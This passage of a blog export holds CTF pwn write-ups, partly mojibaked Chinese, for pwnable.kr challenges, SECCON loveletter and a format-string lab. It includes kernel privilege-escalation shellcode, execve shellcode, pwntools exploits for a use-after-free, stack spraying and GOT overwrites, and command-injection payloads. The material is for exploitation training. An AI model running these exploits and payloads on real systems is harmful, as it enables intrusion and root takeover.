r2, r2 .data:0000000c 1c10 adds r0, r2, #0 .data:0000000e 46f0 mov r8, lr .data:00000010 4a02 ldr r2, [pc, #8] ; (0x0000001c) ;char c &#x3D; src[i].data:00000012 4790 blx r2 .data:00000014 4a02 ldr r2, [pc, #8] ; (0x00000020) ;dst[i] &#x3D; c.data:00000016 321c adds r2, #28 .data:00000018 4790 blx r2 ;i++.data:0000001a bd01 pop &#123;r0, pc&#125; .data:0000001c 8003f924 #cat &#x2F;proc&#x2F;kallsyms|grep commit_creds.data:00000020 8003f550 #cat &#x2F;proc&#x2F;kallsyms|grep prepare_kernel å¾—åˆ°å¯¹åº”çš„å­—èŠ‚ç  123char grant_privs[] = &quot;\\x01\\x60\\x8f\\xe2\\x16\\xff\\x2f\\xe1\\x01\\xb5\\x92\\x1a&quot; &quot;\\x10\\x1c\\xf0\\x46\\x02\\x4a\\x90\\x47\\x02\\x4a\\x1c\\x32&quot; &quot;\\x90\\x47\\x01\\xbd\\x24\\xf9\\x03\\x80\\x50\\xf5\\x03\\x80&quot;; 12345678 #/proc $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h |grep 343#define __NR_vmsplice (__NR_SYSCALL_BASE+343) void * sys_vmsplice = (void *)0x800e3dc8;#343ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„å‡½æ•°SyS_vmsplice syscall(223, grant_privs, sys_vmsplice); syscall(343);... code to cat falg æ–¹æ³•äºŒ ä¿®æ”¹SYS_CALL_TABLEç”±äºæœ€ç»ˆè¦æ‰§è¡Œcommit_creds(prepare_kernel_cred(0));å‡½æ•° æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨è¡¨åˆ†åˆ«æŒ‡å‘commit_creds å‡½æ•°å’Œprepare_kernel_credå‡½æ•° æŸ¥æ‰¾ç³»ç»Ÿè°ƒç”¨è¡¨åï¼Œé€‰å–ç³»ç»Ÿè°ƒç”¨å·æœªstime() ç³»ç»Ÿè°ƒç”¨å·ä¸º time()è¿›è¡Œæ›¿æ¢(ps:é€‰å–è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯å› ä¸ºè¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°åˆšå¥½éƒ½æ˜¯ä¸€ä¸ª) è¿™æ ·è°ƒç”¨syscall(25(syscall(13,0))å°±ç›¸å½“äºè°ƒç”¨äº†commit_creds(prepare_kernel_cred(0)); æ–¹æ³•ä¸‰ è‡ªè®¾syscall Prepare a syscall routine sys_getroot å®ç°commit_creds(prepare_kernel_cred(0));åŠŸèƒ½ Overwrite sys_upper at &amp;SYS_CALL_TABLE[SYS_upper] to sys_getroot with syscall SYS_upper ä¿®æ”¹SYS_CALL_TABLE Call SYS_upper again with addresses of prepare_kernel_cred and commit_creds. è°ƒç”¨SYS_upper crypton1éå¸¸æœ‰æ„æ€çš„å¯†ç é¢˜ ç”¨æˆ·è¾“å…¥ ID + PW æœåŠ¡å™¨è¿”å›é‡‡ç”¨CBCæ¨¡å¼åŠ å¯†çš„AES(ID_PW_cookie)åŠ å¯†hexdigestç»“æœ ï¼ŒPW=sha256(ID+COOKIE).hexdigest ç”¨æˆ·å¾—åˆ°rootçš„PWå³å¯é¡ºåˆ©getshellï¼Œæ€è·¯éå¸¸æ¸…æ™°å…³é”®å°±æ˜¯å¦‚ä½•è·å–COOKIEã€‚ AESçš„CBCæ¨¡å¼ä»¥16å­—èŠ‚(128bit)ä¸ºä¸€ç»„è¿›è¡ŒåŠ å¯† echo1å­˜åœ¨å›ºå®šçš„æŸä¸ªå¯å†™å…¥å†…å®¹çš„åœ°å€idï¼Œå†™å…¥Jmp rsp Ez ROP Jmp rsp echo2 23å­—èŠ‚çš„ä¸€ä¸ªshellcode fsbæ³„éœ²æ ˆåœ°å€ UAF : é€‰4ä¼šfreeæ‰æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ0x28ï¼Œé€‰3ä¼šç”³è¯·å¹¶é‡Šæ”¾ä¸€ä¸ªå¤§å°ä¸º0x20çš„æŒ‡é’ˆã€‚å¦‚æœæˆ‘ä»¬freeæŒ‡é’ˆoï¼Œ3ä¸­ä¼šç”³è¯·åˆ°åˆšfreeçš„å‡½æ•°æŒ‡é’ˆoï¼Œè¦†å†™ç¬¬å››ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘23å­—èŠ‚çš„shellcodeï¼Œè¿™æ ·é€€å‡ºçš„æ—¶å€™å°±æ‰§è¡Œäº†shellcode 1shellcode &#x3D; &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;# 23 bytes 1234567891011121314151617181920212223242526from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;info&#x27;)r = remote(&#x27;pwnable.kr&#x27;,9011) shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;# 23 bytesr.recvuntil(&#x27; : &#x27;)r.sendline(shellcode)r.recvuntil(&#x27;&gt; &#x27;)r.sendline(&#x27;2&#x27;)r.recvuntil(&#x27;\\n&#x27;)#è·å–ebprbp_addr = int(r.recv(16),16)#print(hex(rbp_addr))shellcode_addr = rbp_addr-0x20r.recvuntil(&#x27;&gt; &#x27;)r.sendline(&#x27;4&#x27;)r.recvuntil(&#x27;(y/n)&#x27;)#UAFr.recvuntil(&#x27;&gt; &#x27;)r.sendline(&#x27;3&#x27;)r.interactive() rsa_calculatoråŸºæœ¬æ€è·¯ RSA set keyè¿‡ç¨‹ä¸­å‚æ•°æ ¡éªŒæœ‰é—®é¢˜ï¼Œåº”è¯¥ä¸º||ä¸ç¬¦åˆä¸€ä¸ªå°±æŠ¥é”™ fsb æ³„éœ²canary è¾“å…¥%p.%p.%p.%p.%p.%p.%p.%pæµ‹æ ˆé¡¶åœ¨ç¬¬å‡ ä¸ªå‚æ•° å¯ä»¥çœ‹åˆ°rsiä¸ºç¬¬ä¸€ä¸ªå‚æ•°,æ ˆé¡¶ä¸ºç¬¬6ä¸ªå‚æ•°ï¼Œç»“åˆebpåœ°å€æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º ebpæ˜¯ç¬¬(6+(0x7fffffffdfa0-0x7fffffffd960)/8)=206ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆcanaryå°±æ˜¯205ä¸ªå‚æ•°è¿™æ ·å°±æ³„éœ²å‡ºcanary decrypt()è¿‡ç¨‹å­˜åœ¨æº¢å‡º pri_addr = 0x602960 g_pbuf= 0x602560 æ— ç•Œå¤åˆ¶å¯å¯¼è‡´g_pbufæº¢å‡ºè¦†ç›–pri_addr noteEZ stack spray: spray the stack with your shellcode address Tips: èœå•å¾ªç¯ç”¨çš„æ˜¯é€’å½’ï¼Œæ¯æ¬¡è°ƒç”¨å‡½æ•°æ ˆå¸§å¤§å°æ˜¯å›ºå®šçš„0x430 hex(0xffffc8b0-0xffffcce0)=-0x430 mmap_så‡½æ•°å¢åŠ äº†ç±»ä¼¼äºASLRçš„åŠŸèƒ½è¿”å›ä¸€ä¸ªéšæœºçš„åœ°å€ï¼Œä½†æ˜¯çœ‹æºç å¾—åˆ°:ç”¨äºå­˜å‚¨noteçš„pageåˆ†é…çš„æ˜¯RWXé¡µæƒé™ï¼ŒçŒœæµ‹è¿™ä¸ªé¡µé¢æ˜¯å¯ä»¥æ”¾shellcodeçš„éƒ¨åˆ†ï¼Œç„¶ååˆ©ç”¨ç¨‹åºæ¼æ´è·³è½¬åˆ°è¯¥shellcode 123456789101112131415161718192021222324252627282930ptr = mmap_s((void*)NULL, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);void* mmap_s(void* addr, size_t length, int prot, int flags, int fd, off_t offset)&#123; // security fix: current version of mmap(NULL.. is not giving secure random address if(addr == NULL &amp;&amp; !(flags &amp; MAP_FIXED) )&#123; void* tmp=0; int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1) exit(-1); if(read(fd, &amp;addr, 4)!=4) exit(-1); close(fd); // to avoid heap fragmentation, lets skip malloc area addr = (void*)( ((int)addr &amp; 0xFFFFF000) | 0x80000000 ); while(1)&#123; // linearly search empty page (maybe this can be improved) tmp = mmap(addr, length, prot, flags | MAP_FIXED, fd, offset); if(tmp != MAP_FAILED)&#123; return tmp; &#125; else&#123; // memory already in use! addr = (void*)((int)addr + PAGE_SIZE); // choose adjacent page &#125; &#125; &#125; man mmapæŸ¥ä¸€ä¸‹å„ä¸ªå‚æ•°å‘ç°MAP_FIXEDå­˜åœ¨é—®é¢˜ Stackoverflowè¿™ç¯‡å·²ç»è®²çš„éå¸¸æ¸…æ¥šã€‚ å¾ˆç²¾é«“çš„ä¸€å¥è¯ï¼š I think using â€œMAP_FIXEDâ€ is one of those things where â€œhere, have this gun, but please be careful you donâ€™t shoot yourself in the footâ€. In other words, â€œitâ€™s your task to ensure you use it correctlyâ€. æºç¨‹åºä½¿ç”¨è¿™ä¸ªå‚æ•°çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ç”±äºé¡µé¢ç½®æ¢å¯¼è‡´çš„mmapå¤±è´¥ï¼Œä½†å…¶å®å¦‚æœaddræ‰€åœ¨çš„é¡µé¢å­˜åœ¨ï¼Œæ–°çš„é¡µé¢ä¼šæ›¿æ¢æ‰åŸæ¥çš„é¡µé¢ï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥å®ç°ä»»æ„åœ°å€å†™(ä½†æ˜¯éšæœºçš„) å¯ä»¥åˆ©ç”¨é¡µé¢æ›¿æ¢å°†æ ˆä¸Šæ•°æ®å¡«æ»¡shellcode addrè¿™æ ·returnçš„æ—¶å€™ä¼šè¿”å›åˆ°å¯æ‰§è¡Œçš„shellcodeé¡µé¢ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *#context.log_level = logging.DEBUGe = ELF(&#x27;./note&#x27;)p = process(e.path)p = remote(&quot;127.0.0.1&quot;,9001)context.arch = e.archselect_cnt = 0 #regard stack frame layeresp_start = ******* #This may be different in different os,but it does matters,read the code and you know why.offset = 0x*** #This is certain.Check it out with you GDB.def create(): global select_cnt # in order to modify the variable select_cnt += 1 p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;1&#x27;) p.recvuntil(&#x27;note created. no &#x27;) no = int(p.recvuntil(&#x27;\\n&#x27;).strip(b&#x27;\\n&#x27;), 10) p.recvuntil(&#x27;[&#x27;) ptr = int(p.recvuntil(&#x27;]&#x27;).strip(b&#x27;]&#x27;), 0x10) return (no, ptr)def delete(no): global select_cnt # in order to modify the variable select_cnt += 1 p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;4&#x27;) p.sendlineafter(&#x27;note no?\\n&#x27;, str(no))def write(no, content): global select_cnt # in order to modify the variable select_cnt += 1 p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;2&#x27;) p.sendlineafter(&#x27;note no?\\n&#x27;, str(no)) p.sendlineafter(&#x27;(MAX : 4096 byte)&#x27;, content)def bye(): p.sendlineafter(&#x27;5. exit\\n&#x27;, &#x27;5&#x27;)addr = 0while True: no, addr = create() cur_esp = esp_start - offset * select_cnt if addr &lt; cur_esp: delete(no) else: breakshellcode = asm(shellcraft.sh())shellcode_no, shellcode_addr = create()write(shellcode_no, shellcode)#write your shellcode address here.bye()p.interactive()#This exp is instability for the reason that some important page may be overlapped.If it doest work,try it again :) alloca.ccontral esp,control eip,control the world. 12vuln: alllca use this code to rewrite esp,then control eip, get shell. è‡ªå·±æƒ³wpçš„æ—¶å€™ï¼ŒæŠŠé‡ç‚¹æ”¾åœ¨äº†è¿™é‡Œ$memcpy(buffer+size, \\&amp;g_canary, 4);$ä½†æ˜¯åˆ†æåå‘ç°g_canaryè¢«å†™å…¥äº†æ ˆä¸ŠæŸä¸ªå›ºå®šçš„åœ°å€ã€‚ 12345678910111213141516171819.text:08048745 mov eax, ds:size ; alloca here.text:0804874A add eax, 4 ;eax&#x3D;size+4.text:0804874D lea edx, [eax+0Fh] ;edx&#x3D;size+4+0xf.text:08048750 mov eax, 10h .text:08048755 sub eax, 1 ;eax&#x3D;0xf.text:08048758 add eax, edx ;eax&#x3D;size+4+0xf+0xf.text:0804875A mov ecx, 10h ; é™¤æ•°.text:0804875F mov edx, 0 ;è¢«é™¤æ•°é«˜ä½,ä½ä½ä¸ºeax.text:08048764 div ecx ;eaxä¸ºå•†,edxä¸ºä½™æ•° &#x2F;&#x2F;ç­‰ä»·äºeax&#x3D;eax&#x2F;0x10.text:08048766 imul eax, 10h;eax&#x3D;eax*0x10 &#x2F;&#x2F;ç»“åˆä¸Šæ¡åŠŸèƒ½ä¸ºæ ˆå¯¹é½.text:08048769 sub esp, eax &#x2F;&#x2F;ç”±äºesp&#x3D;esp-eax ä¸Šæ¡ä¸ºæ ˆå‘ä¸Šå¯¹é½(æ³¨æ„åŒºåˆ†esp&amp;0xfff0è¿™ä¸ªä¸ºå‘ä¸‹å¯¹é½).text:0804876B mov eax, esp.text:0804876D add eax, 0Fh ;ç”±äºæ ˆå·²å¯¹é½junk code.text:08048770 shr eax, 4 ;åŒä¸Š.text:08048773 shl eax, 4 ;åŒä¸Š.text:08048776 mov ds:buffer, eax;buffer&#x3D;esp-size-34memcpyæ—¶,g_canaryè¢«æ”¾åˆ°esp-size-34+size&#x3D;esp-34çš„åœ°å€ï¼Œæ— æ³•æ”¹å˜mainå‡½æ•°æ ˆå¸§ æŸ¥çœ‹check_canaryå‡½æ•°è¿˜æœ‰canaryå‹æ ˆçš„æ“ä½œï¼Œæ±‡ç¼–åˆ†æè®¡ç®—åç§»å³å¯ åŒç±»å‹ç»ƒæ‰‹ Seccon CTF quals 2016 loveletter ç¨‹åºåŸºæœ¬æµç¨‹:è¯»å…¥ç”¨æˆ·è¾“å…¥ï¼Œå‚æ•°è¿‡æ»¤åå°†æ•æ„Ÿå­—èŠ‚è½¬æ¢ä¸ºâ™¥(ä¸‰å­—èŠ‚bâ€™\\xe2\\x99\\xa5)ï¼Œç„¶åè¾“å‡ºï¼Œä½†æ˜¯æœ€åè°ƒç”¨çš„æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥echo $str æ”¾å…¥systemå‚æ•°ã€‚å‚æ•°è¿‡æ»¤ä¼šå¯¼è‡´bufæº¢å‡ºï¼Œè¿›è€Œä¿®æ”¹å…³é”®å˜é‡å®ç°shell basic exp just get flag å› ä¸ºè¿‡æ»¤äº†â€™/â€˜æ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡æº¢å‡ºè°ƒsystem(â€œcat flagâ€) 1234567891011121314from pwn import *e = ELF(&quot;./loveletter&quot;)p = process(e.path)payload=b&#x27;cat flag&#x27;payload+=b&#x27; &#x27;* #payload need to cover v6 to 0.payload+=b&#x27;#&#x27; p.sendline(payload)p.interactive() pro exp 1234567891011121314from pwn import *e = ELF(&quot;./loveletter&quot;)p = process(e.path)lover = b&#x27;nv sh -c sh &#x27;payload = b&#x27;;\\x01&#x27;padding = #payload need to cover v6 to 1.payload = lover + padding + payloadp.sendline(payload)p.interactive() explanation about system(â€œenv sh -c sh junkstringâ€). 12345678910111213If env is run without any options, it prints the variables of the current environment. Otherwise, env sets each NAME to VALUE and executes COMMAND.Demo:#!&#x2F;usr&#x2F;bin&#x2F;env command#!&#x2F;usr&#x2F;bin&#x2F;env -[v]S[option]â€¦ [name&#x3D;value]â€¦ command [args]â€¦env sh -c &#39;exec &quot;$@&quot;&#39; sh prog&#x3D; true # also runs &#39;prog&#x3D;&#39;explanation:env sh &#x3D; -c sh &#x2F;&#x2F; junkstring this part is regarded as argv of command. è¯»ä¸€ä¸‹envæºç å’Œman page æ’’èŠ±å®Œç»“","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Format String Analysis Report","slug":"FormatString","date":"2021-09-17T17:24:39.000Z","updated":"2022-03-25T16:58:02.000Z","comments":true,"path":"2021/09/18/FormatString/","link":"","permalink":"http://example.com/2021/09/18/FormatString/","excerpt":"","text":"Format String Analysis Report1.Experiment requirement æŒæ¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸºæœ¬åŸç†ï¼Œå¹¶èƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´ 2.Experiment Target å¯¹format1è¿›è¡Œè¯¦ç»†åˆ†æï¼Œç¼–å†™pythonè„šæœ¬ï¼Œå¹¶æ‹¿åˆ°shellæƒé™ ç¼–å†™å®Œæˆè¯¦ç»†çš„å®éªŒåˆ†ææŠ¥å‘Šï¼Œå¯¹pythonè„šæœ¬å’Œåˆ©ç”¨è¿‡ç¨‹è¿›è¡Œè¯¦ç»†åˆ†æã€‚ 3.Experiment process and analysisShellè„šæœ¬å’ŒGetShellæƒé™ç»“æœæˆªå›¾123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *def generate_format(addr, value): payload = b&#x27;&#x27; print_count = 0 addr_part = b&#x27;&#x27; for i in range(8): if (value &gt;&gt; (8*i)) == 0: break one_byte = (value &gt;&gt; (8*i)) &amp; 0xff temp = &#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;.format((one_byte - print_count) % 0x100, 19 + i) payload+=temp.encode() print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr + i) payload = payload.ljust(48, b&#x27;a&#x27;) payload += addr_part return payloadp=process(&quot;./format1&quot;)e=ELF(&quot;./format1&quot;)so=ELF(&quot;./libc.so.6&quot;)main_addr=0x08048648exit_got=e.got[&#x27;exit&#x27;]puts_got=e.got[&#x27;puts&#x27;]printf_got=e.got[&#x27;printf&#x27;]offset=so.symbols[&#x27;system&#x27;]-so.symbols[&#x27;puts&#x27;]#print(type(exit_got))payload_1=generate_format(exit_got,main_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_1)payload_2=b&#x27;%8$s&#x27;+p32(puts_got)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_2)puts_addr=u32(p.recv(4))sys_addr=puts_addr+offsetpayload_3=generate_format(printf_got,sys_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_3)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(&quot;/bin/sh&quot;)p.interactive() æ•´ä½“æµç¨‹åˆ†æ å°†exitå‡½æ•°çš„GOTè¡¨åœ°å€è¦†å†™ä¸ºmainå‡½æ•°çš„åœ°å€ï¼Œç¨‹åºæ¯æ¬¡é€€å‡ºæ—¶å°†å†è¿”å›åˆ°mainå‡½æ•° é€šè¿‡printfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè·å–putså‡½æ•°åœ°å€ï¼Œå†é€šè¿‡libcçš„ç›¸å¯¹åœ°å€åç§»è·å–systemçš„åœ°å€ ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå°†systemå‡½æ•°åœ°å€è¦†ç›–GOTè¡¨ä¸­printfå‡½æ•°çš„åœ°å€ï¼Œåœ¨buf ä¸­å†™å…¥/bin/shï¼Œå½“æ‰§è¡Œprintf(buf)æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œsystem(&#39;/bin/sh&#39;) è¦†ç›–exitå‡½æ•°çš„GOTè¡¨ä¸ºmainå‡½æ•°åœ°å€123payload_1=generate_format(exit_got,main_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_1) é¦–å…ˆæŸ¥çœ‹å¼€å¯çš„ä¿æŠ¤ è¯¥å¯æ‰§è¡Œæ–‡ä»¶å¼€å¯äº†æ ˆä¿æŠ¤ï¼Œå› æ­¤æ’é™¤ROPæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ€è·¯ï¼Œæœ‰printfå‡½æ•°ï¼Œè€ƒè™‘æ ¼å¼åŒ–å­—ç¬¦ä¸²é—®é¢˜ã€‚ generate_format(exit_got,main_addr)å‡½æ•°åˆ†æ12345678910111213141516def generate_format(addr, value): payload = b&#x27;&#x27; print_count = 0 addr_part = b&#x27;&#x27; for i in range(8)://ä¸ºäº†éå†æ•´ä¸ªvalue,ä½¿å¾—valueå…¨éƒ¨å†™å…¥ if (value &gt;&gt; (8*i)) == 0://ä½æ“ä½œï¼Œä¾æ¬¡å³ç§»8ä½ï¼Œä½¿å¾—æ¯æ¬¡å¾ªç¯å¤„ç†å¹¶å†™å…¥ä¸€ä¸ªå­—èŠ‚ break //valueå…¨éƒ¨å†™å…¥åç»“æŸå¾ªç¯ one_byte = (value &gt;&gt; (8*i)) &amp; 0xff//æå–å‡ºvalueæ²¡æœ‰å†™å…¥çš„éƒ¨åˆ†ä½ä¸­çš„åä¸¤ä½(å³ä½ä½å­—èŠ‚) temp = &#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;.format((one_byte - print_count) % 0x100, 19 + i) //&#x27;&#123;0&#125;c%&#123;1&#125;$hhn&#x27;æ˜¯å‘åœ°å€å•å…ƒ&#123;1&#125;å†™å…¥å­—èŠ‚æ•°æ®&#123;0&#125;+ä¹‹å‰å·²æ‰“å°çš„å­—ç¬¦,mod 0x100æ˜¯å› ä¸ºä¸€å­—èŠ‚æ•°æ®æœ€å¤§å°±ä¸º0xff,one_byte-print_countæ˜¯è€ƒè™‘äº†ä¹‹å‰æ‰“å°çš„å­—ç¬¦ä¸ªæ•°,å…³äºå†™å…¥åœ°å€åé¢é€šè¿‡gdbç»™å‡ºå…·ä½“åˆ†æ payload+=temp.encode() print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr + i) //æœ€åå†™å…¥éœ€è¦å†™å…¥çš„åœ°å€ payload = payload.ljust(48, b&#x27;a&#x27;)//å¡«å……ï¼Œå› ä¸ºæ˜¯32ä½ç¨‹åºï¼Œæ‰€ä»¥æ ˆä¸Šæ•°æ®ä¼šä»¥4biteå¯¹é½,ç”±äºç´¯è®¡å¾ªç¯å†™äº†å››æ¬¡,payloadæ¯æ¬¡å¾ªç¯å†™å…¥çš„å†…å®¹ä¸è¶…è¿‡48å­—èŠ‚,å–å‘ä¸Šå¯¹é½48å­—èŠ‚ payload += addr_part return payload gdbè°ƒè¯•ç¡®å®šå†™å…¥åœ°å€å…ˆç¡®è®¤bufæ•°ç»„åœ¨æ ˆä¸Šçš„åç§» bufåœ°å€ä¸º0x0xffffd12cï¼Œç›¸å¯¹äºæ ˆé¡¶(0xffffd12c-0xffffd110)=0x1c=74ï¼Œå³bufä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ç¬¬7ä¸ªå‚æ•°,åŠ ä¸Šå¡«å……çš„48bytesçš„å†…å®¹=4\\12ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå†™å…¥åœ°å€ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ç¬¬7+12=19ä¸ªå‚æ•°ï¼Œæ­¤ååœ°å€å•å…ƒnumä¾æ¬¡ä¸º20ï¼Œ21ï¼Œ22ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š é€šè¿‡Putså‡½æ•°æ³„éœ²systemåœ°å€&amp;payload_2çš„æ„é€ putså‡½æ•°å’Œsystemå‡½æ•°éƒ½æ˜¯libcåŠ¨æ€é“¾æ¥åº“çš„åŸºæœ¬å‡½æ•°ï¼Œç›¸å¯¹åœ°å€åç§»æ˜¯ç¡®å®šçš„ï¼Œç¡®å®šputså‡½æ•°å®é™…è¿è¡Œåœ°å€åï¼Œå¯ä»¥æ ¹æ®soåº“ä¸­çš„ç›¸å¯¹åœ°å€åç§»è®¡ç®—å‡ºå®é™…è¿è¡Œæ—¶systemå‡½æ•°åœ°å€ 1234payload_2=b&#x27;%8$s&#x27;+p32(puts_got)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_2)puts_addr=u32(p.recv(4)) payload_2é€šè¿‡%n$sæ‰“å°putså‡½æ•°åœ°å€ï¼Œå…¶ä¸­né€šè¿‡ä¹‹å‰åˆ†æçš„bufé¦–åœ°å€ç›¸å½“äºformatçš„ç¬¬ä¸ƒä¸ªå‚æ•°,åˆšå¥½å¯¹åº”%n$så››ä¸ªå­—èŠ‚ï¼Œåé¢è·Ÿç€çš„p32(puts_got)å°±å¯¹åº”ç¬¬å…«ä¸ªformatå‚æ•°ï¼Œè¿™æ ·æ‰“å°å‡ºæ¥å‰å››ä¸ªå­—èŠ‚å°±æ˜¯puts_gotåœ°å€ã€‚ é€šè¿‡ä¿®æ”¹printfå‡½æ•°GOTè¡¨ä¸ºsystemå®ç°GetShell12345678exit_got=e.got[&#x27;exit&#x27;]puts_got=e.got[&#x27;puts&#x27;]printf_got=e.got[&#x27;printf&#x27;]offset=so.symbols[&#x27;system&#x27;]-so.symbols[&#x27;puts&#x27;]sys_addr=puts_addr+offsetpayload_3=generate_format(printf_got,sys_addr)p.recvuntil(&quot;Welcome~\\n&quot;)p.sendline(payload_3) é€šè¿‡ç›¸å¯¹åç§»è®¡ç®—å‡ºsystemå®é™…åœ°å€ï¼Œå†é€šè¿‡generateformatå‡½æ•°å®ç°printfå‡½æ•°gotè¡¨çš„æ›¿æ¢ï¼Œè¿™æ ·å½“è°ƒç”¨printå‡½æ•°çš„æ—¶å€™å®é™…ä¸Šæ˜¯è°ƒç”¨äº†systemå‡½æ•°ï¼ŒåŒæ—¶printfå‡½æ•°çš„å‚æ•°å­˜å‚¨å†bufä¸­,ä¹Ÿæ°å¥½æ˜¯ä¸€ä¸ªå‚æ•°å…¥æ ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡æ ‡å‡†è¾“å…¥â€/bin/shâ€å°±å®ç°äº†â€/bin/shâ€å‹æ ˆå¹¶è°ƒç”¨systemå‡½æ•°çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆæˆåŠŸgetshellï¼Œä¸è¿‡è¿™ä¸ªshellæœ‰ä¸ªå°ç‘•ç–µå°±æ˜¯exitçš„æ—¶å€™ä¼šè¿”å›ä¸€ä¸ªâ€Welcome~â€ã€‚ 4.Summaryâ€‹ é€šè¿‡æœ¬æ¬¡å®éªŒ,å…ˆè°ƒè¯•äº†fs_readã€fs_writeå‡½æ•°ï¼Œå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆä¸Šæ•°æ®å’Œä»»æ„åœ°å€å†™å…¥éæ³•æ•°æ®æœ‰äº†æ›´æ·±åˆ»çš„è®¤è¯†ï¼Œé€šè¿‡å®é™…æ‰‹åŠ¨è°ƒè¯•åˆ†æformat1ï¼ŒæŒæ¡åº”å¯¹å¼€å¯canaryä¿æŠ¤çš„å¯æ‰§è¡Œæ–‡ä»¶çš„pwnæ€è·¯ï¼Œæ­¤ç±»å‹é¢˜ç›®ç‰¹å¾è¾ƒä¸ºæ˜æ˜¾ï¼Œæœ‰ç±»printfå‡½æ•°çš„ä¸æ­£ç¡®ä½¿ç”¨ã€å¼€å¯é‡‘ä¸é›€ä¿æŠ¤ï¼Œä¸€èˆ¬æ¥è¯´éƒ½èƒ½é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´getshellã€‚","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"FormatString","slug":"FormatString","permalink":"http://example.com/tags/FormatString/"}]},{"title":"Return Oriented Programming Report","slug":"EzRop","date":"2021-09-10T17:24:39.000Z","updated":"2022-03-25T13:53:38.000Z","comments":true,"path":"2021/09/11/EzRop/","link":"","permalink":"http://example.com/2021/09/11/EzRop/","excerpt":"","text":"Return Oriented Programming Report1.Experiment requirements é’ˆå¯¹å®éªŒä¸€ï¼Œé€šè¿‡gdbè°ƒè¯•rop1ç¡®å®šShellcodeçš„åœ°å€ï¼›æ­¤å¤–é€šè¿‡rop1.pyçš„è°ƒè¯•è„šæœ¬ç¡®å®šshellcodeçš„åœ°å€ï¼›æœ€ç»ˆæ‹¿åˆ°shellæƒé™ã€‚ç›¸å…³è¯¦ç»†åˆ†æè¿‡ç¨‹å†™å…¥æŠ¥å‘Šï¼Œå¹¶æ¯”è¾ƒä¸¤ç§æ–¹æ³•çš„ç‰¹ç‚¹ã€‚ é’ˆå¯¹å®éªŒäºŒçš„32ä½ç¯å¢ƒå’Œ64ä½ç¯å¢ƒï¼Œé€šè¿‡è°ƒè¯•åˆ†æï¼Œå®Œæˆå®é™…rop2.pyå’Œrop3.py(å¡«è¡¥ç©ºç™½å¹¶ä¿®æ”¹é”™è¯¯)ï¼Œæœ€ç»ˆæ‹¿åˆ°shellæƒé™ã€‚ç›¸å…³è¯¦ç»†åˆ†æå†™å…¥æŠ¥å‘Šã€‚ 2.Expriment Target å·¥å…·æ–¹é¢ï¼šæŒæ¡gdbã€pwntoolsç­‰å·¥å…·çš„ä½¿ç”¨ã€‚ ç†è§£å¹¶æŒæ¡åŸºæœ¬çš„ROPæŠ€èƒ½ï¼Œèƒ½å¤Ÿç¼–å†™pwntoolsè„šæœ¬ã€‚ 